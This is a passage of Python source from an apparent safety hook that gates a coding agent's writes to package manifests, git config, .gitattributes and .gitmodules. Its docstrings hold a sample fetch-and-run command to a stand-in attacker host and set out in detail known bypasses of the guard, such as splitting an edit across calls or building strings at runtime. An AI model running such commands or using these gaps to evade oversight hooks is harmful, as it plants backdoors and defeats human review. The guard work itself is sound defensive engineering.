    ``shell_persist`` do: a ``postinstall: "patch-package"`` or a private
    Artifactory/Verdaccio registry pin is routine, sanctioned dev work, not
    inherently malicious — it just needs a human to have actually looked at
    it.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_PACKAGE_MANIFEST=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    QA history (two independent adversarial reviews, run in parallel): both
    rounds confirmed real bypasses, since fixed — ``pnpm pkg set`` (round A;
    ``NPM_PKG_SET_LIFECYCLE_RE`` hardcoded literal ``npm`` only), a
    jq-piped-through-``sponge`` in-place edit and jq's own ``--arg``
    key-indirection form (round A + round B; closed by
    ``JQ_SCRIPTS_LIFECYCLE_RE``, checked unconditionally like
    ``NPM_PKG_SET_LIFECYCLE_RE``/``REGISTRY_HIJACK_CLI_RE``), Yarn Classic's
    real space-delimited ``.yarnrc`` syntax (round B; the guard's own stated
    coverage for that file was dead code against an ``=``-only pattern), a
    reference MCP filesystem server's real ``edit_file`` shape (round A;
    ``{path, edits: [{oldText, newText}]}`` carries no top-level
    content/new_string key, so the original extraction always resolved
    empty), a too-tight ``{0,300}`` bound on the poetry-source content check
    (round A; widened to ``{0,2000}``, matching ``_HOOKSPATH_INI_RE_SRC``'s
    precedent), and thin CLI-only registry-hijack coverage for
    poetry/composer/cargo (round B; now covered by ``REGISTRY_HIJACK_CLI_RE``
    alongside npm/pnpm/yarn/pip).

    Known residual gaps, same spirit as every guard in this file, disclosed
    rather than fixed: a direct fetch-to-file write (``curl -o package.json
    ...``) is caught by none of the shell branch's write-verb checks, the
    same inherited gap every sibling guard already discloses; ``find
    -path``/``-name`` indirection around the manifest/config filename is not
    covered (no ``*_find_hit``-style fallback here, unlike self-protect/
    ci-workflow/git-hooks/agent-def/shell-persist); a value assembled via the
    target language's own string-building (Python ``'post'+'install'``, an
    f-string, ``.join()``) rather than appearing as one contiguous literal in
    the scanned text defeats both content checks — ``normalize.scan_surface``
    de-obfuscates shell-level quoting/encoding, not an embedded interpreter's
    own runtime string construction, the same "computed indirectly" class of
    gap every other guard in this file already accepts for shell-computed
    paths in general (round B, verified, not fixed — solving it in general is
    equivalent to evaluating arbitrary code); a lifecycle-script key split
    across two separate tool calls — an innocuous placeholder value planted
    and approved first, then swapped for the real payload in a second Edit
    whose ``old_string``/``new_string`` never repeats the key name — evades
    detection on the second call, since (like every guard in this file) there
    is no cross-call session state to notice the two edits target the same
    key (round A, verified, not fixed — the same "each tool call is evaluated
    independently" limitation ``git_hooks``' ``GIT_CONFIG_GLOBAL``/
    ``GIT_CONFIG_SYSTEM`` gap and every other guard's split-across-calls gap
    already accept); a commented-out example line in a registry-config file
    (a ``# index-url = ...`` template line, common generated-file boilerplate)
    still matches ``REGISTRY_HIJACK_RE`` and asks unnecessarily (round A,
    verified, not fixed — the accepted false-positive-over-false-negative
    trade-off every guard in this file already takes, and requiring
    line-start-anchoring to exclude it would have broken real detection on
    the shell branch, where a whole multi-clause command is one unbroken
    line with no comment/line-start distinction to anchor on); and, like
    every other guard here, a write-verb only needs to appear ANYWHERE in
    the command alongside the matched path, not adjacent to or provably
    operating on it — the accepted false-positive-over-false-negative
    trade-off every sibling guard in this file already takes."""
    cfg = getattr(policy, "package_manifest", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "package-manifest-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        # Claude Code's native Edit/Write always carry the changed text under
        # content/new_string, but a third-party MCP filesystem server's own
        # edit tool doesn't follow that convention — the reference
        # filesystem server's `edit_file`, for one, nests each change as
        # {path, edits: [{oldText, newText}]}, with no top-level content/
        # new_string key at all (QA finding, independent adversarial review,
        # round A): the original `a.get("content") or a.get("new_string")`
        # extraction resolved to "" for that real, common shape, so the
        # guard exited immediately and never saw the planted script. Falling
        # back to every string/number leaf in the MCP call's args (the same
        # `_flatten_strings` helper `_net_text` uses, for the identical
        # "arbitrary JSON shape, no fixed key convention across servers"
        # reason) closes it — Edit/Write keep the precise, narrower
        # extraction since their shape is fixed and known.
        content = str(a.get("content") or a.get("new_string") or "")
        if not content and ev.action == ActionClass.MCP:
            content = " ".join(_flatten_strings(a))
        if not p or not content:
            return None
        script_hit = bool(patterns.PACKAGE_SCRIPTS_PATH_RE.search(p)
                           and patterns.LIFECYCLE_SCRIPT_KEY_RE.search(content))
        registry_hit = bool(patterns.REGISTRY_CONFIG_PATH_RE.search(p)
                             and patterns.REGISTRY_HIJACK_RE.search(content))
        if not (script_hit or registry_hit):
            return None
        if (os.environ.get("AEGIS_ALLOW_PACKAGE_MANIFEST")
                or _package_manifest_allowed_by_policy(cfg, p)):
            return None
        reason = (f"Package manifest '{p}' is being written with a lifecycle-"
                  "script hook — it runs automatically, with no explicit "
                  "invocation, on the next install" if script_hit else
                  f"Package registry config '{p}' is being written — it "
                  "redirects where every future dependency install fetches "
                  "from")
        return _finish(Decision(action, "package-manifest-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_PACKAGE_MANIFEST=1; a spawned agent "
                         "cannot set this."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd))
        script_hit = bool(patterns.NPM_PKG_SET_LIFECYCLE_RE.search(cmd)
                           or patterns.JQ_SCRIPTS_LIFECYCLE_RE.search(cmd)
                           or (write_verb
                               and patterns.PACKAGE_SCRIPTS_PATH_RE.search(cmd)
                               and patterns.LIFECYCLE_SCRIPT_KEY_RE.search(cmd)))
        registry_hit = bool(patterns.REGISTRY_HIJACK_CLI_RE.search(cmd)
                             or (write_verb
                                 and patterns.REGISTRY_CONFIG_PATH_RE.search(cmd)
                                 and patterns.REGISTRY_HIJACK_RE.search(cmd)))
        if not (script_hit or registry_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_PACKAGE_MANIFEST")
                or _package_manifest_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A lifecycle-script hook is being planted in a package "
                  "manifest from a shell — it runs automatically on the "
                  "next install" if script_hit else
                  "A package registry/index is being redirected from a "
                  "shell — every future dependency install will fetch from "
                  "the new source")
        return _finish(Decision(action, "package-manifest-protect",
                         f"{reason}. A human may append '# aegis-allow', or "
                         "set AEGIS_ALLOW_PACKAGE_MANIFEST=1; a spawned "
                         "agent cannot."))
    return None


def _git_config_exec_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_git_config_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block two git-config-driven persistence/exfiltration primitives
    ``rule_git_hooks_protect`` doesn't reach (it only watches
    ``core.hooksPath``): redirecting ``credential.helper``, and planting a
    ``!``-prefixed shell-command value on any git-config key (most
    commonly ``alias.<name>``, but the same convention applies to
    ``core.pager``/``core.editor``/``diff.external``/
    ``mergetool.<name>.cmd``/...).

    THREAT MODEL: a git alias whose value starts with ``!`` runs through
    the shell, in full, on the very next ``git <name>`` invocation — by
    the human, a teammate, or an unattended CI runner — with that
    invoker's full privileges, no confirmation, and a diff that reads as
    an ordinary one-line config addition, not a backdoor. Same "write now,
    auto-exec later, unattended" shape as a git hook, just reached through
    ``git config`` instead of ``.git/hooks/*``. ``credential.helper`` is
    the credential-EXFILTRATION variant: on every future authenticated
    ``fetch``/``push``/``pull``, git invokes the configured helper and
    hands it the target host — and, on a ``store`` verb, the actual
    username/password/PAT — before the real request even goes out. An
    attacker-controlled helper silently captures every credential the
    human types from then on; ``--global``/``--system`` widen that to
    every repo they ever touch, not just this one.

    Config (``policy.git_config_exec``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the
    gate — a repo's own trusted credential-manager bootstrap, say).
    Defaults to ``ask`` for the same reason every sibling ``*_protect``
    guard does: setting a credential helper or a shell alias is routine,
    sanctioned dev work (``git config credential.helper cache``,
    ``alias.undo = !git reset --soft HEAD^``) — it just needs a human to
    have actually looked at it.

    Escapable only by a human: a trailing '# aegis-allow' on the shell
    form, or the env toggle ``AEGIS_ALLOW_GIT_CONFIG_EXEC=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    ``credential.helper`` is gated on the KEY alone (any value) — every
    value, even a built-in (``cache``/``store``/``manager``), names a
    program git will run and hand real credentials to, so there is no
    safe/dangerous split by value the way there is for a bare alias. Every
    OTHER exec-capable key is gated on the VALUE starting with ``!``
    instead — an ordinary alias (``co = checkout``) is completely benign,
    and a key-only gate on ``alias.*`` would fire on nearly every
    dev-environment bootstrap script, the same ask-fatigue trade-off
    ``rule_package_manifest_protect``'s content-vs-path-only gate already
    made.

    Honest scope, same denylist trade-offs as every guard in this file: a
    value assembled indirectly (shell variable concatenation, a wrapper
    script that itself invokes ``git config``) rather than appearing as
    one contiguous literal in the scanned text is not caught; ``find``
    -path/-name indirection around the git-config file path is not
    covered (no ``*_find_hit``-style fallback here, unlike git_hooks/
    ci_workflow/agent_def/shell_persist); a direct fetch-to-file write
    (``curl -o .git/config``) is caught by none of the shell branch's
    write-verb checks — this guard's shell branch doesn't gate on a
    write-verb at all (unlike its siblings), since the CLI/inline-config
    forms are already the dominant, expected way this surface is reached
    from a shell; and the paired ``GIT_CONFIG_KEY_n``/``GIT_CONFIG_VALUE_n``
    env-injection form is matched independently per side (key-side for
    ``credential.helper``, value-side for a bang-prefixed value) rather
    than confirming the two actually pair up — the same "each tool
    call/text span is evaluated independently, no cross-reference state"
    limitation ``git_hooks``'s ``GIT_CONFIG_GLOBAL``/``GIT_CONFIG_SYSTEM``
    gap already accepts. A value quoted with a leading space before ``!``
    (``alias.foo ' !cmd'`` — real git does NOT treat this as shell-exec,
    the raw value's first character is the space, not ``!``) is still
    conservatively gated: ``normalize.scan_surface``'s shared quote-
    stripping de-obfuscation layer (used by every guard in this file, not
    unique to this one) collapses the quote-then-space into plain
    whitespace before this guard ever sees the text, indistinguishable at
    that point from a genuinely unquoted bang-prefixed value (round A,
    verified, not fixed — a disclosed, accepted false positive, the same
    "false positives are the safe direction" trade-off every guard here
    already takes, not worth threading quote-adjacency state through
    normalization for).

    QA history (two independent adversarial reviews, run in parallel):
    both rounds confirmed real, since-fixed issues — a URL-scoped
    ``credential.<url>.helper`` (real git syntax) bypassed the original
    bare-``credential.helper``-only key check entirely (round A); a
    literal two-character ``\\n`` immediately before ``helper`` (as a
    ``printf``/``echo`` format string produces, before runtime
    interpretation — as opposed to a heredoc's real newline) broke the INI
    check's word-boundary requirement (round A); the path-independent
    staged-elsewhere INI check false-positived on unrelated files sharing
    the same ``[section]``/``=!`` shape for a different reason (a systemd
    unit's ``ExecStart=!...``, a ``.desktop`` file) — fixed by scoping it
    to git's own section-name vocabulary (round A); a read-only ``git
    config --get``/``--get-all``/``--get-regexp``/``--get-urlmatch`` query
    was gated identically to an actual set (round A); a distinct, longer
    key merely containing ``credential.helper`` as a substring
    (``credential.helper.timeout``) false-positived on the key-only gate
    (round A); ``GIT_CONFIG_FILE_PATH_RE`` (reused from the hooksPath
    guard) missed a submodule's real config (``.git/modules/<name>/
    config``), a bare repo's config (``<name>.git/config``), and a linked
    worktree's config override (``.git/worktrees/<name>/config.worktree``)
    — widened, which also benefits ``rule_git_hooks_protect``'s own reuse
    of the same pattern (round B); and the plain ``git config <key>
    <value>`` bang-value check's original freeform gap could skip past the
    true key/value boundary and match a ``!`` appearing later inside an
    otherwise-ordinary quoted argument's own content, gating values that
    don't actually start with ``!`` at all — fixed by anchoring on an
    explicit key token immediately followed by the value position (round
    B)."""
    cfg = getattr(policy, "git_config_exec", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "git-config-exec-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        content = str(a.get("content") or a.get("new_string") or "")
        if not content and ev.action == ActionClass.MCP:
            content = " ".join(_flatten_strings(a))
        if not content:
            return None
        path_confirmed = bool(p and patterns.GIT_CONFIG_FILE_PATH_RE.search(p))
        helper_hit = bool(
            patterns.GIT_CONFIG_CREDENTIAL_HELPER_INI_RE.search(content)
            or (path_confirmed and patterns.GIT_CONFIG_HELPER_CONTENT_RE.search(content)))
        bang_hit = bool(
            patterns.GIT_CONFIG_BANG_VALUE_INI_RE.search(content)
            or (path_confirmed and patterns.GIT_CONFIG_BANG_VALUE_CONTENT_RE.search(content)))
        if not (helper_hit or bang_hit):
            return None
        if (os.environ.get("AEGIS_ALLOW_GIT_CONFIG_EXEC")
                or _git_config_exec_allowed_by_policy(cfg, p)):
            return None
        reason = (f"'{p}' is being written with a credential.helper redirect"
                  if helper_hit else
                  f"'{p}' is being written with a '!'-prefixed shell-command "
                  "config value (alias or similar)")
        return _finish(Decision(action, "git-config-exec-protect",
                         f"{reason} — it runs automatically, with the "
                         "invoking user's full privileges, on the next "
                         "matching git operation. Review the change, then "
                         "confirm with AEGIS_ALLOW_GIT_CONFIG_EXEC=1; a "
                         "spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        helper_hit = bool(patterns.GIT_CONFIG_CREDENTIAL_HELPER_RE.search(cmd)
                           or patterns.GIT_CONFIG_CREDENTIAL_HELPER_INI_RE.search(cmd))
        bang_hit = bool(patterns.GIT_CONFIG_BANG_VALUE_RE.search(cmd)
                         or patterns.GIT_CONFIG_BANG_VALUE_INI_RE.search(cmd))
        if not (helper_hit or bang_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_GIT_CONFIG_EXEC")
                or _git_config_exec_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A credential.helper redirect is being set from a shell"
                  if helper_hit else
                  "A '!'-prefixed shell-command config value is being set "
                  "from a shell")
        return _finish(Decision(action, "git-config-exec-protect",
                         f"{reason} — it runs automatically, with the "
                         "invoking user's full privileges, on the next "
                         "matching git operation. A human may append "
                         "'# aegis-allow', or set "
                         "AEGIS_ALLOW_GIT_CONFIG_EXEC=1; a spawned agent "
                         "cannot."))
    return None


def _git_attrs_exec_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_git_attributes_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block wiring a `.gitattributes`/`.git/info/attributes` path pattern to a
    `filter=<name>`/`diff=<name>`/`merge=<name>` driver, and setting any of the
    git-config keys that run that driver — `filter.<name>.clean`/`smudge`/
    `process`, `diff.<name>.textconv`/`command`, `merge.<name>.driver` — or the
    two OTHER git-config keys that run a program directly with no `!`-prefix
    marker at all: `core.fsmonitor`, `core.sshCommand`.

    THREAT MODEL: `rule_git_config_exec_protect` catches a `!`-prefixed value
    on any git-config key (an alias, `core.pager`, ...) — but a filter/diff/
    merge driver value, `core.fsmonitor`, and `core.sshCommand` are NOT
    bang-prefixed; git runs them directly as a shell command regardless, so
    `git config filter.evil.smudge "curl attacker.example/x|sh"` sails through
    that guard's `GIT_CONFIG_BANG_VALUE_RE` family with zero detection despite
    being just as executable as a bang-aliased command. Once BOTH halves are in
    place — a `.gitattributes` line mapping some path pattern to `filter=evil`
    (or `diff=evil`/`merge=evil`), and a `filter.evil.smudge`/`clean` config
    value — the single most ordinary git actions there are (`git add`, `git
    checkout`, `git diff`, `git status`, `git log -p`, `git show`, a merge)
    silently shell out to that command, with the invoking user's or CI's full
    privileges, for every matching path — no special command name for the
    human to notice, unlike a git alias which needs them to type `git
    <alias-name>` specifically. `.gitattributes` is also typically TRACKED and
    pushed with the repo, so it reads as routine configuration (line-ending
    rules, LFS tracking) in an ordinary PR diff, not as a wired detonator —
    the driver config half is what actually arms it, and is usually left
    untracked in `.git/config`, so a reviewer skimming the pushed diff never
    sees it at all. `core.fsmonitor`/`core.sshCommand` need no `.gitattributes`
    pairing at all: the former runs on nearly every git command once set, the
    latter on every fetch/push/pull over SSH.

    Config (``policy.git_attributes_exec``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the gate —
    a repo's own trusted git-lfs bootstrap, say). Defaults to ``ask`` for the
    same reason every sibling ``*_protect`` guard does: git-lfs and similar
    tools set `filter.lfs.*`/`.gitattributes` entries as routine, sanctioned
    setup — it just needs a human to have actually looked at it. The
    direct-exec config keys are gated on the KEY ALONE (any value), the same
    reason `rule_git_config_exec_protect` gates `credential.helper` that way:
    there's no safe/dangerous value split for a key whose only purpose is
    naming a program to run. That does cost a false "ask" on the fully-inert
    `core.fsmonitor = true`/`false` builtin toggle — accepted, same "false
    positives are the safe direction" trade-off this file takes throughout.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, same denylist trade-offs as every guard in this file: the
    shell branch's `.gitattributes`-wiring check (`patterns.gitattrs_wiring_
    hit`) is deliberately NOT clause-scoped — it checks "is `.gitattributes`/
    `.git/info/attributes` named, and does a `filter=`/`diff=`/`merge=`
    assignment appear" over the WHOLE scanned command, not per-clause. This
    costs a false ASK on an unusual `&&`/`;`-joined one-liner that names
    `.gitattributes` in one part and happens to contain an unrelated
    `filter=`/`diff=`/`merge=`-shaped substring (ordinary prose) in another,
    completely unrelated part. Accepted deliberately, after QA (independent
    adversarial review, four consecutive rounds — see `gitattrs_wiring_hit`'s
    own module-level comment in patterns.py for the full history) found that
    every attempt at clause-SCOPED matching to avoid this false positive
    introduced a WORSE false-NEGATIVE bypass in exchange — a false ASK is
    recoverable, a false ALLOW on a working exploit is not, the same
    principle every guard in this file already applies to its own denylist
    gaps. A `.gitattributes`/config value assembled indirectly (shell
    variable concatenation, a wrapper script) rather than one contiguous
    literal is not caught; a submodule's real `.git/modules/<name>/info/
    attributes` path is not covered (unlike `GIT_CONFIG_FILE_PATH_RE`'s own
    submodule handling — disclosed, not fixed, to keep this guard's first
    pass proportionate); archive/sync tools (`rsync`/`tar`/`unzip`) placing
    `.gitattributes` without naming it as a discrete write-verb argument are
    not covered (no `ARCHIVE_SYNC_VERB_RE`-style check here); and, like
    `git_config_exec`,
    the paired `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` env-injection form is
    matched on the key alone rather than confirmed to pair with any
    particular value — moot here anyway, since these keys are gated
    key-only regardless of value. `_GIT_ATTRS_EXEC_KEY`'s subsection-name
    class excludes ASCII whitespace/quotes/`=` (see `_GIT_CONFIG_SUBSECTION_
    CHAR`), so an OUTER-SHELL-quoted subsection containing a literal ASCII
    space (`git config 'filter.evil driver.smudge' /tmp/x`, real,
    git-accepted syntax) still evades the CLI-form key check (QA finding,
    independent adversarial review, round A) — disclosed, not fixed;
    verified NOT independently exploitable end-to-end, since `.gitattributes`
    values are ASCII-space/tab-delimited, so an ASCII-spaced driver name can
    never actually be referenced by a `filter=`/`diff=`/`merge=` attribute in
    the first place. A DISTINCT, initially-missed variant of this same class
    WAS independently exploitable and has been fixed (QA finding, round C,
    follow-up verification, confirmed end-to-end against real git): a
    subsection name containing NON-ASCII whitespace (U+00A0 NO-BREAK SPACE)
    needs no shell quoting at all — bash only treats ASCII space/tab/newline
    as word separators — so it survives as one plain shell token, AND
    `.gitattributes` itself only delimits on ASCII space/tab too, so a
    NBSP-bearing driver name CAN be referenced and CAN complete the full
    chain; the original class (excluding Python's Unicode-aware whitespace
    metacharacter, not just ASCII whitespace) also treated NBSP as
    whitespace, unlike bash and unlike gitattributes, truncating the match
    before it ever reached the exec-capable
    leaf key and leaving the arm command with zero detection at any mode,
    not even a disclosed-but-visible gap. `_GIT_CONFIG_SUBSECTION_CHAR` now
    excludes only the ASCII separators real shell/gitattributes tokenization
    actually uses, closing the NBSP variant while leaving the ASCII-spaced,
    genuinely-inert one as the sole remaining disclosed gap."""
    cfg = getattr(policy, "git_attributes_exec", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "git-attributes-exec-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        # QA findings (independent adversarial review, rounds A and B) on
        # this exact extraction: (1) `MultiEdit`/`NotebookEdit` are
        # ActionClass.EDIT (see events.py), not MCP, but put their text
        # under `edits: [{new_string}, ...]`/`new_source` — neither key this
        # scan checked — so the old MCP-only flatten fallback never ran for
        # them and both content/new_string came back empty, a silent total
        # bypass for two mainstream builtin tools. (2) an MCP tool whose
        # `content` argument is a non-empty NESTED structure (the common
        # "content block" list-of-dicts shape) was still truthy, so the old
        # code did `str(a_list_of_dicts)` instead of falling through to the
        # flatten path (that branch only ran when content was EMPTY) —
        # `str()` on a nested structure renders an embedded string via
        # `repr()`, turning real newlines/tabs into literal two-character
        # `\n`/`\t` sequences that break every `\b`-anchored pattern below
        # expecting real whitespace immediately before a key. Fixed by
        # always falling through to the depth-capped `_flatten_strings`
        # walker (which reads real leaf strings as-is, no repr() mangling)
        # whenever direct extraction doesn't yield a non-empty plain string
        # — for EVERY action class, not just MCP.
        raw_content = a.get("content")
        if not isinstance(raw_content, str) or not raw_content:
            raw_content = a.get("new_string")
        if isinstance(raw_content, str) and raw_content:
            content = raw_content
        else:
            content = " ".join(_flatten_strings(a))
        if not content:
            return None
        attrs_path = bool(p and patterns.GIT_ATTRS_PATH_RE.search(p))
        attrs_hit = attrs_path and bool(patterns.GIT_ATTRS_DRIVER_ASSIGN_RE.search(content))
        config_path = bool(p and patterns.GIT_CONFIG_FILE_PATH_RE.search(p))
        key_hit = bool(
            patterns.GIT_ATTRS_EXEC_INI_RE.search(content)
            or (config_path and patterns.GIT_ATTRS_EXEC_CONTENT_RE.search(content)))
        if not (attrs_hit or key_hit):
            return None
        if (os.environ.get("AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC")
                or _git_attrs_exec_allowed_by_policy(cfg, p)):
            return None
        reason = (f"'{p}' is wiring a path pattern to a filter/diff/merge driver"
                  if attrs_hit else
                  f"'{p}' is being written with a direct-exec git-config key "
                  "(a filter/diff/merge driver command, core.fsmonitor, or "
                  "core.sshCommand)")
        return _finish(Decision(action, "git-attributes-exec-protect",
                         f"{reason} — once paired with the other half, it runs "
                         "automatically, with the invoking user's full "
                         "privileges, on the next matching git operation "
                         "(add/checkout/diff/status/merge). Review the change, "
                         "then confirm with AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1; "
                         "a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        # NOT clause-scoped — see `patterns.gitattrs_wiring_hit`'s own
        # comment for the QA history (rounds A/C/D/E) of why three
        # successive clause-scoping attempts each closed one confirmed
        # false-ALLOW bypass while opening a different one (or, in the
        # last attempt, a ReDoS), and why checking both conditions over the
        # whole scanned command — accepting the narrower, disclosed
        # cross-clause false positive every sibling `*_protect` guard in
        # this file already accepts an equivalent of — is the safe
        # direction here.
        attrs_hit = patterns.gitattrs_wiring_hit(cmd)
        key_hit = bool(patterns.GIT_ATTRS_EXEC_KEY_RE.search(cmd)
                        or patterns.GIT_ATTRS_EXEC_INI_RE.search(cmd))
        if not (attrs_hit or key_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC")
                or _git_attrs_exec_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A .gitattributes path pattern is being wired to a "
                  "filter/diff/merge driver from a shell" if attrs_hit else
                  "A direct-exec git-config key (a filter/diff/merge driver "
                  "command, core.fsmonitor, or core.sshCommand) is being set "
                  "from a shell")
        return _finish(Decision(action, "git-attributes-exec-protect",
                         f"{reason} — once paired with the other half, it runs "
                         "automatically, with the invoking user's full "
                         "privileges, on the next matching git operation "
                         "(add/checkout/diff/status/merge). A human may append "
                         "'# aegis-allow', or set "
                         "AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1; a spawned agent "
                         "cannot."))
    return None


def _gitmodules_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_gitmodules_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block a `.gitmodules` submodule-hijack: an `ext::`/`file://` URL scheme
    (git-remote-ext RCE / CVE-2022-39253-class local disclosure) or a `path =`
    parent-traversal segment (CVE-2018-11235/CVE-2024-32002-class hooks-
    directory collision), plus setting `protocol.ext.allow`/
    `protocol.file.allow` to an allowing value — the override git's own
    2.38.1+ default requires before either scheme is allowed to run at all.

    THREAT MODEL: `.gitmodules` (superproject root, or nested inside a
    submodule's own working tree) declares each submodule's `url`/`path`
    under a `[submodule "<name>"]` section. Unlike `.git/hooks/*` or
    `.git/config`, it is an ORDINARY TRACKED file — pushed, diffed, and
    reviewed like any other change — which is exactly what makes it a
    comfortable place to smuggle a detonator wired to arm on a FUTURE,
    different git operation (`git clone --recurse-submodules`, `git
    submodule update --init [--recursive]`, or a plain `pull`/`fetch` with
    `submodule.recurse=true` configured), by a teammate or CI, not
    necessarily this session — the same "runs later, unattended, possibly
    higher-privileged" shape every sibling `*_protect` guard in this file
    exists for. `url = ext::<command>` invokes git's `git-remote-ext`
    transport, which runs `<command>` as a literal shell invocation to
    satisfy the "fetch" — a real, documented RCE primitive (git-remote-
    ext(1)), not an obscure trick. A `path = ` traversal segment lets git
    materialize a submodule's working tree (and, on vulnerable/older git,
    its `.git/modules/<name>` metadata) OUTSIDE the intended directory —
    historically enabling an overwrite straight into `.git/hooks/*`, the
    exact payload `rule_git_hooks_protect` exists to stop, arriving through
    a file that guard never inspects at all.

    Config (``policy.gitmodules``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate — a
    repo's own trusted vendored-submodule bootstrap, say). Defaults to
    ``ask`` for the same reason every sibling git-config-family guard does:
    adding an ordinary (https://-scheme) submodule is routine, sanctioned
    dev work — it just needs a human to have actually looked at the two
    specific schemes/traversal shape that are never legitimate.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_GITMODULES=1`` set by the orchestrator/
    human before launch for the Edit/Write/MCP-tool form. A spawned agent
    cannot set its own env for a hook invocation it doesn't control, so
    neither path is agent-self-escapable.

    Honest scope, same denylist trade-offs as every guard in this file: a
    `url`/`path` value assembled indirectly (shell variable concatenation,
    a wrapper script) rather than one contiguous literal defeats every
    check; there is no `find`-path-indirection fallback (the same absence
    `rule_package_manifest_protect`/`rule_direnv_protect`/
    `rule_ipython_startup_protect` already disclose for their own targets);
    a direct fetch-to-file write (`curl -o .gitmodules ...`) is closed by
    `rule_fetch_to_file_protect` reusing `GITMODULES_PATH_RE`, not by this
    guard's own write-verb checks (which, like `git_config_exec`'s CLI
    forms, deliberately has none — the `git submodule add`/`git config`
    subcommand IS the write, not a verb applied to an already-named path);
    the `protocol.ext.allow`/`protocol.file.allow` override check is
    gated on the KEY alone (any allowing value) and so costs a false ask
    on an operator legitimately re-enabling the scheme for a trusted,
    already-audited internal mirror — accepted, the same "false positives
    are the safe direction" trade-off `core.fsmonitor`/`core.sshCommand`
    already take in `rule_git_attributes_exec_protect`; and the
    `GIT_CONFIG_VALUE_n=ext::...`/`file://...` env-injection alternative on
    `GITMODULES_CONFIG_URL_CLI_RE` is matched on the value alone, not
    confirmed to pair with a `submodule.*.url` key, the same
    `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` split-across-calls limitation
    `rule_git_hooks_protect`/`rule_git_config_exec_protect` already
    disclose for their own env-injection forms; and `GITMODULES_TRAVERSAL_
    BARE_RE` (the value-only-diff traversal check, see its own docstring)
    has no way to tell a malicious `path =` traversal apart from git's own
    LEGITIMATE relative submodule `url = ../sibling-repo.git` convention
    once the key context a value-only diff lacks by definition is gone —
    both are the identical bare string shape. Accepted, the same "false
    positives are the safe direction" trade-off this docstring already
    takes for `protocol.ext.allow`/`protocol.file.allow` above: an editor
    changing an existing relative submodule URL costs one false ask.

    Two independent adversarial-review rounds on this guard (run in
    parallel — bypass-hunting and design/consistency, the same convention
    every guard in this file follows) found and closed three real,
    reproduced bugs before merge, round 1: (1) the ``gitmodules`` policy
    knob was never wired into ``aegis.loader``'s three merge spots, so
    `mode`/`allow` set in real YAML policy were silently dropped and the
